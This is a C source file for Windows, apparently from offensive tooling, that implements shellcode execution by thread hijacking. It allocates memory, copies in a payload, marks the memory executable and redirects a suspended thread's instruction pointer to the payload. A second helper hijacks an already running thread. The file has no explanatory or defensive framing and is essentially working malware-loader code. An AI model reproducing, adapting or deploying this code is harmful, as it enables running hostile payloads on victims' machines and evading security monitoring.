#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>


BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID		pAddress = NULL;
	DWORD		dwOldProtection = NULL;

	CONTEXT		ThreadCtx = {
								.ContextFlags = CONTEXT_CONTROL
	};

	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;


	/*
		- in case of a x64 payload injection : we change the value of `Rip`
		- in case of a x32 payload injection : we change the value of `Eip`
	*/

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	return TRUE;
}

BOOL ThreadHijacking(PBYTE pPayload, SIZE_T stPayloadSize, LPCSTR DllName, LPCSTR FunName, DWORD delayMilliseconds) {
	DWORD dwThreadId;
	HANDLE hThread;

	PVOID pSleepAddr = GetProcAddress(GetModuleHandleA(DllName), FunName);

	if (pSleepAddr == NULL) {
		return -1;
	}

	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pSleepAddr, NULL, CREATE_SUSPENDED, &dwThreadId);

	if (hThread != NULL) {
		RunViaClassicThreadHijacking(hThread, pPayload, stPayloadSize);

		ResumeThread(hThread);
		WaitForSingleObject(hThread, delayMilliseconds);
		CloseHandle(hThread);
	}

	return 0;
}

// ===============================================

BOOL HijackThread(HANDLE hThread, PVOID pAddress) {
	SuspendThread(hThread);

	CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };

	if (GetThreadContext(hThread, &ctx)) {
		ctx.Rip = (DWORD64)pAddress;
		SetThreadContext(hThread, &ctx);
	}

	while (ResumeThread(hThread) > 0);

	return TRUE;
}

// ==========================================================================

